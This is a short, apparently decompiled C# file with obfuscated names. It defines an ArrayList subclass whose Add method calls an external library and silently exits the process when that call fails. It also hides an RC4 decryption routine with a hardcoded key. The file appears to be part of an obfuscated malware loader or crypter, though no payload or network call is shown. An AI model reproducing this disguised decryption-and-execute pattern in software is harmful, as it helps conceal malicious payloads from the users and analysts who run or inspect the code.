using System;
using System.Collections;
using System.Text;
using System.Threading;
using Gcalmuzpmqwmccg;

namespace Esulsglfyznb;

public sealed class e : ArrayList
{
	private EventHandler m_b;

	private int c;

	private int d;

	private int m_e;

	private int f;

	private int g;

	private int[] h;

	private int[] l;

	private byte[] m;

	public e()
	{
		new a();
	}

	public void a(EventHandler a)
	{
		EventHandler eventHandler = this.m_b;
		EventHandler eventHandler2;
		do
		{
			eventHandler2 = eventHandler;
			EventHandler value = (EventHandler)Delegate.Combine(eventHandler2, a);
			eventHandler = Interlocked.CompareExchange(ref this.m_b, value, eventHandler2);
		}
		while ((object)eventHandler != eventHandler2);
	}

	public void b(EventHandler a)
	{
		EventHandler eventHandler = this.m_b;
		EventHandler eventHandler2;
		do
		{
			eventHandler2 = eventHandler;
			EventHandler value = (EventHandler)Delegate.Remove(eventHandler2, a);
			eventHandler = Interlocked.CompareExchange(ref this.m_b, value, eventHandler2);
		}
		while ((object)eventHandler != eventHandler2);
	}

	public override int Add(object a)
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			new ClassLibrary().Data();
		}
		catch
		{
			Environment.Exit(0);
		}
		int result = base.Add(a);
		this.a(EventArgs.Empty);
		return result;
	}

	private byte[] a(byte[] a)
	{
		string s = "Qfhajewd";
		byte[] bytes = Encoding.UTF8.GetBytes(s);
		h = new int[256];
		l = new int[256];
		m = new byte[a.Length];
		for (d = 0; d < 256; d++)
		{
			h[d] = bytes[d % bytes.Length];
			l[d] = d;
		}
		this.a(ref a);
		return m;
	}

	private void a(ref byte[] a)
	{
		d = 0;
		for (m_e = 0; d < 256; d++)
		{
			m_e = (m_e + l[d] + h[d]) % 256;
			g = l[d];
			l[d] = l[m_e];
			l[m_e] = g;
		}
		d = 0;
		m_e = 0;
		for (c = 0; d < a.Length; d++)
		{
			c++;
			c %= 256;
			m_e += l[c];
			m_e %= 256;
			g = l[c];
			l[c] = l[m_e];
			l[m_e] = g;
			f = l[(l[c] + l[m_e]) % 256];
			m[d] = (byte)(a[d] ^ f);
		}
	}

	public byte[] b(byte[] a)
	{
		return this.a(a);
	}

	private void a(EventArgs a)
	{
		if (this.m_b != null)
		{
			this.m_b(this, a);
		}
	}

	public override void Clear()
	{
		base.Clear();
		a(EventArgs.Empty);
	}
}
